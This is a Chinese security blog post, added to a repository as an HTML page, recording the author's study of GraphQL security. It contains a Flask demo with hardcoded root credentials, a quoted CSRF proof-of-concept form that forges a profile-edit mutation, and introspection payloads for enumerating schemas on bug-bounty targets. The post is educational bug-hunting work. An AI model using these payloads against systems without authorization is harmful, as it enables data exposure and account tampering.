@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content>
+
+<link rel="shortcut icon" href="https://ws1.sinaimg.cn/large/005IUN3mly1g71rwo5k7bj30hs0hsmxx.jpg">
+
+
+<title> 我的GraphQL安全学习之旅</title>
+
+
+<link rel="stylesheet" href="/css/bulma.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/base.css">
+</head>
+<body>
+
+  <style media="screen">
+hr {
+  height: 1px;
+    background-color: black;
+    margin-top: 0px;
+    border: none;
+    margin-bottom: 0px;
+}
+.black {
+
+
+background-color: hsl(0,0%,7%);;
+
+
+}
+ #shadow {
+  text-shadow: 2px 3px 3px white;
+  margin-top: 3px;
+}
+h1 {
+  text-shadow: 2px 3px 3px black;
+ }
+.menu {
+margin-top: -80px;
+
+
+
+
+}
+#nav {
+  margin-left: 2px;
+  margin-right: 2px;
+}
+  #banner {
+    position: relative;
+
+  }
+</style>
+<header>
+
+  <section class="section black is-medium" id="banner">
+    <div class="container">
+      <h1 id="sitetitle" class="title is-3 has-text-white-bis has-text-centered is-capitalized has-text-weight-bold">
+        
+        Deen&#39;s blog
+      </h1>
+
+      <h2 id="shadow" class="subtitle is-4 has-text-white is-capitalized has-text-centered">
+
+      </h2>
+
+    </div>
+
+    </div>
+  </section>
+<!--TOP Menu-->
+  <div class="menu level" >
+<div class="level-item has-text-centered"></div>
+    <nav class=".navbar level-item" >
+      
+        <a style="text-shadow: 2px 2px 3px grey" id="nav" class="button is-text is-outlined is-primary " href="
+
+
+            /archives
+            "> Archive</a>
+        
+        <a style="text-shadow: 2px 2px 3px grey" id="nav" class="button is-text is-outlined is-primary " href="
+
+
+            /about
+            "> About</a>
+        
+    </nav>
+    <div class="level-item has-text-centered"></div>
+</div>
+
+  <hr>
+
+
+
+
+
+
+</header>
+
+
+
+<link rel="stylesheet" href="/css/highlight.css">
+<style>
+    .markdown-body {
+        box-sizing: border-box;
+        min-width: 200px;
+        max-width: 960px;
+        margin: 0 auto;
+        padding: 45px;
+    }
+
+    @media (max-width: 767px) {
+        .markdown-body {
+            padding: 15px;
+        }
+    }
+    #postsec {
+        clear: left;
+    }
+
+
+
+    .details {
+        float: left;
+        padding-left: 10px;
+        font-size: 18px;
+
+    }
+    div > span {
+       margin-left: 0px;
+      margin-top: 0px;
+    }
+</style>
+<section id="post_section" class="container markdown-body" >
+
+    <!--title,date,tags-->
+    <h2 id="hidden">
+        我的GraphQL安全学习之旅
+    </h2>
+
+    <section class="desec">
+
+        
+    </section>
+
+
+    <!-- content -->
+    <section id="postsec"><h2 id="GraphQL简介"><a href="#GraphQL简介" class="headerlink" title="GraphQL简介"></a>GraphQL简介</h2><p>GraphQL是Facebook的一个开源项目，定义了一种查询语言，用来代替传统的RESTful API。看到QL这样的字眼，很容易产生误解，以为是新的数据库查询语言，但其实GraphQL和数据库没有什么太大关系，GraphQL并不直接操作查询数据库，可以理解为传统的后端代码与数据库之间又多加了一层，这一层就是GraphQL.</p>
+<p>传统的RESTful API是一个接口对应一个url，GraphQL是通过一个url接口改变请求所POST的查询参数，来达到多个api的查询效果。</p>
+<h2 id="GraphQL初窥"><a href="#GraphQL初窥" class="headerlink" title="GraphQL初窥"></a>GraphQL初窥</h2><p>在查找GraphQL资料的过程中，都可以看到一个简单的demo，不过查询结果都是代码写死的，对于理解GraphQL和数据库之间的关系，并不是很有帮助，我写了一个简单和数据库连接的demo，python代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask_sqlalchemy import SQLAlchemy</span><br><span class="line">import os</span><br><span class="line">import graphene</span><br><span class="line">from graphene_sqlalchemy import SQLAlchemyObjectType, SQLAlchemyConnectionField</span><br><span class="line">from flask_graphql import GraphQLView</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.debug = True</span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">app.config[&apos;SQLALCHEMY_DATABASE_URI&apos;] = &apos;mysql+pymysql://root:root@127.0.0.1:3306/test?charset=utf8mb4&apos;</span><br><span class="line">app.config[&apos;SQLALCHEMY_COMMIT_ON_TEARDOWN&apos;] = True</span><br><span class="line">app.config[&apos;SQLALCHEMY_TRACK_MODIFICATIONS&apos;] = True</span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line">class UserModel(db.Model):</span><br><span class="line">    __tablename__ = &apos;user&apos;</span><br><span class="line">    id = db.Column(db.Integer, primary_key=True)</span><br><span class="line">    name = db.Column(db.String(256), index=True, unique=True)</span><br><span class="line">    password = db.Column(db.String(256), index=True)</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return &apos;&lt;User %r&gt;&apos; % self.username</span><br><span class="line">class User(SQLAlchemyObjectType):</span><br><span class="line">    class Meta:</span><br><span class="line">        model = UserModel</span><br><span class="line">        </span><br><span class="line">class Query(graphene.ObjectType):</span><br><span class="line">    users = graphene.List(User)</span><br><span class="line">        </span><br><span class="line">    def resolve_users(self, info):</span><br><span class="line">        return UserModel.query.all()</span><br><span class="line">        </span><br><span class="line">schema = graphene.Schema(query=Query)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return &apos;&lt;p&gt; Hello World!&lt;/p &gt;&apos;</span><br><span class="line"></span><br><span class="line">app.add_url_rule(</span><br><span class="line">    &apos;/graphql&apos;,</span><br><span class="line">    view_func=GraphQLView.as_view(</span><br><span class="line">        &apos;graphql&apos;,</span><br><span class="line">        schema=schema,</span><br><span class="line">        graphiql=True</span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>访问<a href="http://localhost:5000/" target="_blank" rel="noopener">http://localhost:5000/</a> 即可看到demo。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">query&#123;</span><br><span class="line">  users&#123;</span><br><span class="line">    id,</span><br><span class="line">    password,</span><br><span class="line">    name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查询结果如下：</p>
+<p><img src="https://ask.qcloudimg.com/http-save/2359520/79tkc3a9vb.jpeg" alt="查询结果.png"></p>
+<p>查询出来的数据即<code>UserModel.query.all()</code>的执行结果。但如果我要在浏览器实现只查询id=2的用户的信息是做不到，因为后端python代码里没有写，<strong>也就是说，只有代码里写了接口，定义了相应的schema，才能通过GraphQL查询出对应结果，所以并不是通过GraphQL就能查询获取数据库所有数据</strong>。</p>
+<h2 id="GraphQL的安全问题"><a href="#GraphQL的安全问题" class="headerlink" title="GraphQL的安全问题"></a>GraphQL的安全问题</h2><p>如果看过p牛在先知大会上的分享——《攻击GraphQL》，会对GraphQL的安全问题有一个全面的认识。这里，在GraphQL安全问题研究上，我并没有新的发现，可以算是个人的学习笔记以及自己的一些理解。</p>
+<p>让我们先回顾一下p牛总结的问题。</p>
+<p><img src="https://ask.qcloudimg.com/http-save/2359520/o0rgsqfslf.jpeg" alt="GraphQL安全问题总结.png"></p>
+<p>这ppt中提到的sql注入，个人感觉和GraphQL并不是太大关系，在不了解GraphQL的时候，一度以为看到用了GraphQL就以为找到了注入。如果代码的数据库查询都是像我上面那样的规范操作，自然是不存在sql注入的。若查询返回数据的方式使用的是原生语句查询数据库，一旦用户参数未经安全过滤进入数据库，还是存在sql注入。</p>
+<p>至于csrf，GraphQL可以通过Mutation进行数据更改，若graphql接口未做安全校验，自然可以通过构造恶意html进行攻击。ppt中给的poc如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;</span><br><span class="line"> &lt;form action=&quot;https://graphqlapp.herokuapp.com/&quot; method=&quot;POST&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;query&quot;</span><br><span class="line">value=&quot;mutation&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;editProfile&amp;#40;name&amp;#58;&amp;quot;hac</span><br><span class="line">ker&amp;quot;&amp;#44;&amp;#32;age&amp;#58;&amp;#32;5&amp;#41;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;n</span><br><span class="line">ame&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;age&amp;#10;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line"> &lt;/form&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>个人在挖掘src的过程中，碰到不少站点有用到GraphQL进行数据查询。发现的漏洞主要是信息泄露，和ddos拒绝服务。</p>
+<p>发现的ddos漏洞在黑盒层面无法判断是否和GraphqQL有直接的关系，漏洞很简单，在graphql的query请求当中，有一个limit参数，当我将参数调成一个超大数字时，网站就卡死宕机了，无法判断后端哪一层崩溃了。</p>
+<p>再回到信息泄露的问题上，个人觉得这才是大家在用GraphQL进行开发时，常忽略的地方。<strong>GraphQL可以使用schema和type查询可用的对象和对象的所有字段</strong>。</p>
+<p>如下，以我上面的demo为例，查询可用对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">query __schema&#123;</span><br><span class="line">  __schema&#123;</span><br><span class="line">    types&#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ask.qcloudimg.com/http-save/2359520/bwznzufyjc.jpeg" alt="image.png"></p>
+<p>得到User，再查询User的字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;      __type(name: &quot;User&quot;) &#123;</span><br><span class="line">           name</span><br><span class="line">           fields &#123;</span><br><span class="line">               name</span><br><span class="line">               type &#123;</span><br><span class="line">                   name</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ask.qcloudimg.com/http-save/2359520/4huzc2zc9b.jpeg" alt="image.png"></p>
+<p>在实际挖洞过程中，就可判断是否存在敏感字段，如用户的password，phone，address等。再做进一步的漏洞挖掘。</p>
+<p>但有时目标网站可能存在几十个对象，一个一个查找出具体的字段显示是太麻烦了，是否可以编写工具进行批量查询呢？本想自己写一下，但发现已经有大佬给我们做好了。</p>
+<p>项目在git地址为<code>https://github.com/doyensec/graph-ql</code>，通过这个工具可以详细列出网站的对象还有对应字段。分析他的python源码可以得到这两个payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description locations args&#123;...InputValue&#125;&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description args&#123;...InputValue&#125;onOperation onFragment onField&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试效果如下，只需一次请求就可列出对象和字段。</p>
+<p><img src="https://ask.qcloudimg.com/http-save/2359520/d79vkgsg20.jpeg" alt="image.png"></p>
+<p>工具的效果如下：</p>
+<p><img src="https://ask.qcloudimg.com/http-save/2359520/oj8whilscn.jpeg" alt="image.png"></p>
+<p>在实际使用过程中，<strong>常常需要修改脚本，修改post的参数名称以及返回结果的参数名，使之与实际请求结果相对应，若有登陆态校验，则还需要添加cookie</strong>，这一块脚本有待改进,有时间就造一个顺手的轮子。</p>
+<p>至于嵌套查询导致ddos，在实际挖掘中暂时没有碰到，具体介绍可以参考freebuf的《GraphQL安全指北》这篇文章。</p>
+<p><strong>已经造完了</strong></p>
+<p>实现很简单，把上一个项目生成html的函数抠出来，再自己重写一个发送payload的请求的函数，避免修改请求头和cookie的麻烦，至于原来项目硬编码取返回包data参数导致有些情况下无法使用的问题，我添加了一个-d参数来解决，即当返回结果不是data参数时，可以指定参数名。</p>
+<p>项目地址：<a href="https://github.com/deenrookie/x-graphql" target="_blank" rel="noopener">https://github.com/deenrookie/x-graphql</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf" target="_blank" rel="noopener">https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf</a></li>
+<li><a href="https://www.freebuf.com/articles/web/184040.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/184040.html</a></li>
+</ul>
+
+    </section>
+
+
+</section>
+<script>var title = document.getElementById("hidden");
+    title.style.display = "none";
+    sitetitle = document.getElementById("sitetitle");
+    titlev = title.childNodes[0].nodeValue;
+    sitetitle.innerHTML = titlev;
+    shadow = document.getElementById("shadow");
+    shadow.style.visibility = "hidden";
+</script>
+<!-- 评论系统-->
+
+
+
+
+
+<style>
+    #height {
+        height: 100px;
+        box-sizing: border-box;
+        color: rgb(51, 51, 51);
+        font-size: 18px;
+        font-weight: 400;
+
+    }
+
+    .footer_p {
+        box-sizing: border-box;
+        font-size: 18px;
+        font-weight: 200;
+        line-height: 27px;
+        text-align: center;
+        text-rendering: optimizelegibility;
+    }
+
+    .footer_link {
+        color: black;
+    }
+</style>
+<script src="/js/jquery.js"></script>
+
+<!-- 特效 -->
+<script type="text/javascript" color="#555" opacity='0.9' zIndex="-1" count="100"
+src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+
+</script>
+<script src="/js/highlight.pack.js"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function(event) {
+        var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+        codeBlocks.forEach(function(block, index) {
+            hljs.highlightBlock(block);
+        });
+    });
+</script>
+
+</body>
